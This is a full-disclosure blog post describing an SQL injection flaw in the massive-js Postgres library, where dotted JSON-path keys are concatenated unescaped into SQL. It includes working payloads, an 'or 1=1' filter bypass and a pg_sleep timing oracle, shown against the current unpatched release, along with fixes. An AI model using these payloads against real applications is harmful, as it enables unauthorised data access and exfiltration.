---
layout: post
title: "The Dot That Opened a Door"
subtitle: "Massive-js binds every value you filter on. But put a dot in the key and it stops binding — and starts building a string literal by hand."
date: 2026-09-09
tags: [sql-injection, nodejs, postgres, cwe-89, full-disclosure]
read_time: "6 min read"
---

[massive-js](https://gitlab.com/dmfay/massive-js) is a lovely, document-style data-mapper for Postgres and Node. You write `db.users.find({ status: 'active' })` and it turns the criteria object into a parameterised query — `status` becomes a column, `'active'` becomes `$1`. It is the *safe* interface, the one you're supposed to reach for instead of raw SQL. Values are bound. Everyone's happy.

It also has a genuinely nice feature: if a key contains a dot, it's a JSON traversal. `db.users.find({ 'data.role': 'admin' })` reaches into a JSONB column. Convenient. Idiomatic. And the exact spot where the parameter binding quietly stops.

## The boring part

The whole selling point is that `find(criteria)` is parameterised. The Sails/Express reflex — and massive-js grew up in that world — is to forward `req.query` or `req.body` straight into `find()`, because that's the safe API, right? The values are bound. What you're trusting is that the *keys* are just column names.

## The tilt-your-head part

Follow a dotted key into `lib/util/parse-key.js`:

```js
lhs = `${path}${operator}'${jsonElements[0]}'`;            // :202 single key
lhs = `${path}${operator}'{${jsonElements.join(',')}}'`;   // :212 multi-element path
```

`jsonElements` are the parts of the key *after* the dot — attacker-controlled, because the key is attacker-controlled. And they are dropped inside a single-quoted SQL string literal `'...'` with **no escaping of `'`**. Then `lhs` is emitted verbatim into `WHERE ${predicate}` and `ORDER BY`. So the value went through the front door and got bound as `$1`, exactly as promised — but the *key*, once it had a dot in it, went through the side door and got concatenated. A `'` in the JSON path closes the literal.

## Proof

Against published `massive@6.11.3` (current latest), live Postgres:

<div class="term">
  <div class="term-bar"><span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span><span class="term-title">node poc.js — massive 6.11.3</span></div>
<pre><span class="dim">--- WHERE bypass: filter defeated, returns every row ---</span>
db.users.find({ <span class="cmd">"data.x'||''='x'or/**/1=1--"</span>: 'IGNORED' })
SQL: SELECT * FROM "users" WHERE "data"->>'x'||''='x'<span class="bad">or/**/1=1</span>--' = $1
=> returns ALL rows despite the non-matching bound value

<span class="dim">--- time-based: attacker runs pg_sleep from a criteria key ---</span>
db.users.find({ <span class="cmd">"data.x'||pg_sleep(1)||'"</span>: 'pub' })
SQL: ... WHERE "data"->>'x'||<span class="warn">pg_sleep(1)</span>||'' = $1
=> measured ~2.01s</pre>
</div>

The comment `--` neatly discards massive-js's own trailing `'` and its `= $1`, so the injected `or 1=1` stands alone and the WHERE is defeated. The `||` string-concat variant lets an attacker splice in `pg_sleep` — a time oracle that needs no output channel at all. The `order[].field` path is injectable the same way.

## The fix

Escape `'` (and reject backslashes and comment sequences) in each JSON path element before it goes into the `'...'` literal — or, better, bind the path as a parameter instead of building a literal at all. Validating each JSON key token against a strict allowlist (`^[A-Za-z0-9_]+$`) closes it too. massive-js *documents* its genuinely-unsafe surfaces (`options.exprs`, `order[].expr`, `search.tsv`) — the dotted-key path in `find()` is not one of them, which is exactly why this is a bug and not an escape hatch.

## Where this stands

Present on `massive@6.11.3`, current `latest`, no CVE, no fix. Full disclosure. The repo is on GitLab with no advertised security channel, which is part of why this is going out publicly. If you use massive-js: never forward raw `req.query`/`req.body` keys into `find()`/`findOne()`/`count()` or `order[].field`; whitelist the keys against your known columns first.

## Takeaways

- **"Values are parameterised" is a claim about values, not keys.** The moment a key stops being a plain column name — a dot, an operator suffix — re-ask where it lands.
- **Blind is enough.** The `pg_sleep` oracle means an attacker needs zero data returned to exfiltrate a database one bit at a time.
- **Forwarding `req.body` wholesale is the real-world trigger.** The framework culture that made this convenient is the same one that makes it exploitable.

<hr>

*Full disclosure. Present on `massive@6.11.3` (current latest) at time of writing; no CVE assigned, no fix released. Reproduced live end-to-end on Postgres.*
